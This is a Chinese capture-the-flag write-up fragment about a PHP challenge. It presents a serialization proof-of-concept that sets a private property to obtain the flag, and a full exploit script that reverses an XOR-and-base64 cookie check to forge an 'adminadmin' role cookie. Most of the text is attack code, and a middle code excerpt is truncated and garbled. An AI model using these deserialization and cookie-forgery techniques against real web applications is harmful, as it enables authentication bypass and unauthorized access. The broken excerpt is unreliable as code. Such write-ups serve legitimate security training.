只要$a不等于nothing就可以直接拿 flag，POC如下

<?php

class Test{
    private $a;
    public function __construct(){
        $this->a = "anything";
    }
}

$b = new Test();

echo urlencode(serialize($b));
?>

将序列化字符串经过urlencode()是因为private属性会有不可见字符，编码后可用

{
    $t="";

    {
        $t.=chr(ord($key[$i])^$i);
    }

    return $t;
}
$auth = false;
$role1 = "xxxxxxxxx";

if (isset($_COOKIE["role_true"])) {
    $hsh = $_COOKIE["hsh"];

看一下cookie

因为cookie会自动url编码，所以需要先解码一下。先运行脚本得到role1的值为adminadmin。然后仔细观察，发现只要urldecode($_COOKIE[“role”])等于ctt(base64_encode($s))就能通过第二个条件，完整 EXP 如下

<?php

function ctt($key)
{
    $t="";
    for($i=0;$i<strlen($key);++$i)
    {
        $t.=chr(ord($key[$i])^$i);
    }

    return $t;
}

echo base64_decode(ctt(urldecode("YVPweR3oRN%3B%7Bnj32")))."\n";

$s = "adminadmin";

echo urlencode(ctt(base64_encode($s)));
?>

然后把得到的值拿去提交就行了
